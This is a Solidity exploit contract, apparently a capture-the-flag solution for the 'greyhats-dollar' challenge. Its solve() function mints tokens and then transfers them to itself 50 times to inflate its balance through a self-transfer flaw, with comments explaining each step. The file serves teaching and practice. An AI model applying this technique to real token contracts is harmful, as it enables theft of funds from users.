// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import { Setup } from "src/greyhats-dollar/Setup.sol";
import {Test, console} from "forge-std/Test.sol";

contract Exploit {
    Setup setup;

    constructor(Setup _setup) {
        setup = _setup;
    }
    function solve() external {
        // Step 1: Claim 1000 GREY tokens
        // The function begins by calling setup.claim() to claim 1000 GREY tokens.
        setup.claim();

        // Step 2: Approve GHD contract
        // It then grants approval for the GHD contract to spend the GREY tokens 
        // by calling approve on the GREY token contract, allowing the GHD contract 
        // to spend an unlimited amount (type(uint256).max).
        setup.grey().approve(address(setup.ghd()), type(uint256).max);

        // Step 3: Mint GHD tokens
        // After approval, the function mints GHD tokens by transferring the 1000 GREY tokens 
        // to the GHD contract using setup.ghd().mint(1000e18).
        setup.ghd().mint(1000e18);

        // Step 4: Looped transfers
        // The function performs a loop 50 times, transferring 1000 GHD tokens 
        // to the contract itself (address(this)) on each iteration.
        for (uint256 i = 0; i < 50; i++) {
            setup.ghd().transfer(address(this), 1000e18);
        }

        // Step 5: Transfer accumulated GHD to the caller
        // Once the loop completes, the function transfers all the accumulated GHD tokens 
        // from the contract to the caller (msg.sender) using 
        // setup.ghd().transfer(msg.sender, setup.ghd().balanceOf(address(this))).
        setup.ghd().transfer(msg.sender, setup.ghd().balanceOf(address(this)));
    }
}
